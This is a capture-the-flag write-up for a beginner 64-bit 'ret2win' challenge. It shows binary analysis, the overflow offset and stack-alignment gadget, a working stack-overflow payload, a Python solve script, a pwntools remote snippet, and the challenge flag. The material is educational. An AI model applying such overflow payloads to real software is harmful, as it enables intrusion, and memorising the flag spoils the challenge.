# ret2win — SECLEAF Access Terminal

> **Category:** Binary Exploitation (pwn)
> **Difficulty:** Beginner
> **Flag Format:** `SecLeaf{}`
> **Flag:** `SecLeaf{sm4sh_th3_st4ck}`

---

## Challenge Description

> A vulnerable SECLEAF access terminal was recovered from a decommissioned internal server.
> The developers claimed the system was "unbreakable."
> Can you prove otherwise?

We are given a 64-bit ELF binary called `ret2win`. Our goal is to exploit it and retrieve the hidden flag.

---

## Analysis

### Step 1 — Identify the Binary

```bash
file ret2win
```

**Output:**
```
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=cc7a6bc9a6ea18f86e867b29b5e18777ee6b6fee,
for GNU/Linux 3.2.0, not stripped
```

Key observations:
- 64-bit x86 ELF binary
- **Not stripped** — function names are still present (helpful for analysis)
- Dynamically linked (uses system libc)

---

### Step 2 — Check Security Protections

```bash
checksec --file=ret2win
```

**Output:**
```
Arch:    amd64-64-little
RELRO:   Partial RELRO
Stack:   No canary found       ← no stack protection!
NX:      NX unknown
PIE:     No PIE (0x400000)     ← fixed base address!
Stack:   Executable
RWX:     Has RWX segments
```

| Protection | Status | What it means |
|------------|--------|---------------|
| Stack Canary | ❌ None | No cookie protecting the return address |
| PIE | ❌ Disabled | Binary loads at a fixed address every run |
| RELRO | ⚠️ Partial | GOT is partially writable |
| NX | ❓ Unknown | Stack may be executable |

**No stack canary + no PIE = classic ret2win scenario.** We can overflow the stack and redirect execution to any function we want, at a known address.

---

### Step 3 — Find Interesting Functions

```bash
objdump -d ret2win | grep ">:"
```

**Output:**
```
0000000000401166 <decode>:
00000000004011b1 <win>:
000000000040123b <vuln>:
000000000040128d <main>:
```

There are four functions:

| Function | Address | Purpose |
|----------|---------|---------|
| `main` | `0x40128d` | Entry point — calls `vuln()` |
| `vuln` | `0x40123b` | Takes user input — **the vulnerable function** |
| `win` | `0x4011b1` | Prints the flag — **never called normally** |
| `decode` | `0x401166` | Decodes an obfuscated string (used by `win`) |

The name `ret2win` is a classic CTF hint: **return to `win`**.

---

### Step 4 — Analyze the Vulnerable Function

```bash
objdump -d ret2win | grep -A 30 '<vuln>'
```

**Key disassembly of `vuln()`:**
```asm
40123f:  48 83 ec 40    sub $0x40,%rsp       ; allocates 64 bytes for buffer
...
401262:  be c8 00 00 00 mov $0xc8,%esi       ; reads UP TO 200 (0xc8) bytes
401267:  48 89 c7       mov %rax,%rdi
40126a:  e8 f1 fd ff ff call 401060 <fgets@plt>
```

**The bug:** The buffer on the stack is only **64 bytes** (`0x40`), but `fgets` is allowed to read **200 bytes** (`0xc8`). This is a classic **stack buffer overflow**.

---

### Step 5 — Calculate the Overflow Offset

To overwrite the **return address** (RIP), we need to fill:

```
[ 64 bytes buffer ] + [ 8 bytes saved RBP ] = 72 bytes of padding
                                               ↑
                                         then overwrite RIP here
```

```
Stack Layout:
┌─────────────────────────┐  ← rsp
│  64 bytes  (buffer)     │  ← our input starts here
├─────────────────────────┤
│   8 bytes  (saved RBP)  │
├─────────────────────────┤
│   8 bytes  (saved RIP)  │  ← we overwrite this with win()'s address
└─────────────────────────┘
```

**Offset to RIP = 64 + 8 = 72 bytes**

---

### Step 6 — Analyze the `win()` Function

```bash
objdump -d ret2win | grep -A 40 '<win>'
```

`win()` at `0x4011b1`:
1. Loads an obfuscated byte string into local stack variables using `movabs`
2. Calls `decode()` with a key (`0x55`) to XOR-decode the flag in-place
3. Calls `printf("Flag: %s\n", decoded_flag)` and exits

The flag is stored **encoded** in the binary and decoded at runtime — that's why you can't just `strings` it out.

---

### Step 7 — Stack Alignment (Important for 64-bit)

On x86-64 Linux, the **System V ABI requires the stack to be 16-byte aligned** before a `call` instruction. If it's misaligned, `movaps` instructions inside libc functions like `printf` will crash with a segfault.

To fix this, we add a single **`ret` gadget** before jumping to `win()`. This burns one stack slot and restores alignment.

```bash
# Find a plain 'ret' gadget
objdump -d ret2win | grep "c3"
```

We use the `ret` at `0x401016`.

---

## Exploitation Steps

### Manual Test (verify crash)

```bash
python3 -c "print('A' * 80)" | ./ret2win
```

If you see a segfault, the overflow is working.

### Build the Payload

```
payload = [72 bytes of 'A'] + [ret gadget @ 0x401016] + [win() @ 0x4011b1]
```

```bash
python3 -c "
import struct
payload  = b'A' * 72
payload += struct.pack('<Q', 0x401016)   # ret gadget (stack alignment)
payload += struct.pack('<Q', 0x4011b1)   # win()
import sys; sys.stdout.buffer.write(payload)
" | ./ret2win
```

**Output:**
```
Tell me your name: Hello, AAAA...

Access Granted!
Flag: SecLeaf{sm4sh_th3_st4ck}
```

---

## Python Solve Script

```python
#!/usr/bin/env python3
"""
ret2win exploit — SECLEAF CTF
Technique: Stack Buffer Overflow → ret2win
Author: [your handle]
"""

import struct
import subprocess

# ── Target addresses (from objdump) ──────────────────────────────────────────
WIN_ADDR    = 0x4011b1   # win() — prints the flag
RET_GADGET  = 0x401016   # plain 'ret' — fixes 16-byte stack alignment

# ── Overflow offset ───────────────────────────────────────────────────────────
# vuln() allocates 0x40 (64) bytes for buffer
# + 8 bytes for saved RBP  =  72 bytes until we control RIP
OFFSET = 64 + 8   # = 72

# ── Build payload ─────────────────────────────────────────────────────────────
payload  = b"A" * OFFSET                      # fill buffer + saved RBP
payload += struct.pack("<Q", RET_GADGET)       # align stack to 16 bytes
payload += struct.pack("<Q", WIN_ADDR)         # redirect return to win()

# ── Run locally ───────────────────────────────────────────────────────────────
result = subprocess.run(["./ret2win"], input=payload, capture_output=True)
output = result.stdout.decode(errors="replace")

print("[*] Binary output:")
print(output)

# ── Extract flag ──────────────────────────────────────────────────────────────
for line in output.splitlines():
    if "Flag:" in line or "SecLeaf{" in line:
        print(f"\n[+] FLAG FOUND: {line.strip()}")
```

**Run it:**
```bash
chmod +x solve.py
python3 solve.py
```

**Output:**
```
[*] Binary output:
Tell me your name: Hello, AAAA...

Access Granted!
Flag: SecLeaf{sm4sh_th3_st4ck}

[+] FLAG FOUND: Flag: SecLeaf{sm4sh_th3_st4ck}
```

> **For remote targets**, swap `subprocess.run` for a `pwntools` `remote()` connection:
> ```python
> from pwn import *
> p = remote("challenge.host", 1337)
> p.sendline(payload)
> p.interactive()
> ```

---

## Explanation

### Why Does This Work?

The vulnerability chain:

```
1. vuln() creates a 64-byte buffer on the stack
        ↓
2. fgets() reads up to 200 bytes — no bounds check
        ↓
3. We send 72 bytes of padding to reach the saved return address
        ↓
4. We overwrite the return address with win()'s address (0x4011b1)
        ↓
5. When vuln() executes its final 'ret', the CPU pops our address
        ↓
6. Execution jumps to win(), which decodes and prints the flag
```

### Why the `ret` Gadget?

x86-64 requires the stack pointer (RSP) to be **16-byte aligned** at the moment of a `call`. After our overflow, RSP is 8 bytes off. By inserting a single `ret` gadget first, we consume 8 bytes from the stack, restoring alignment before `win()` runs `printf` internally.

Without it: `movaps` inside libc → **segfault**.  
With it: smooth execution → **flag**.

### Why Can't We Just `strings` the Flag?

The flag is stored **XOR-encoded** with key `0x55` in the binary's `.text` section. The `decode()` function decrypts it at runtime inside `win()`. Running `strings ret2win` only shows garbled bytes — we must actually execute `win()` to get the plaintext flag.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `file` | Identify binary type and architecture |
| `checksec` | Enumerate security mitigations |
| `objdump -d` | Disassemble binary, find functions and gadgets |
| `python3 / struct` | Build and send the binary exploit payload |
| `pwntools` | (optional) For remote/interactive exploitation |

---

## Key Concepts Learned

- **Stack buffer overflow** — writing past a buffer's end to corrupt saved RIP
- **ret2win** — redirecting control flow to a hidden function that was never called
- **Stack alignment** — why a `ret` gadget is needed before calling libc functions on x86-64
- **XOR obfuscation** — why `strings` alone isn't enough; runtime decoding hides the flag

---

## Final Flag

```
SecLeaf{sm4sh_th3_st4ck}
```
